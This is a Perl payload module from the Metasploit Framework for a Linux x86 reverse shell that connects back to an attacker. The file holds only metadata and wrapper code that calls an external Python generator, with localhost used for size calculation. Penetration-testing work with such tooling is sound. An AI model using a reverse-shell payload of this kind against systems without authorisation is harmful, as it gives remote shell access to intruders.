package Msf::Payload::linx86_reverse_ie;
use strict;
use base 'Msf::PayloadComponent::ExternalPayload';
sub load {
  Msf::PayloadComponent::ExternalPayload->import('Msf::PayloadComponent::ReverseConnection');
}

my $info =
{
  'Name'         => 'linx86reverse_ie',
  'Version'      => '1.0',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => 0,
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/linx86reverse_ie.py';
  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate({'LHOST' => '127.0.0.1', 'LPORT' => '4444',});
  return(length($bin));
}

1;
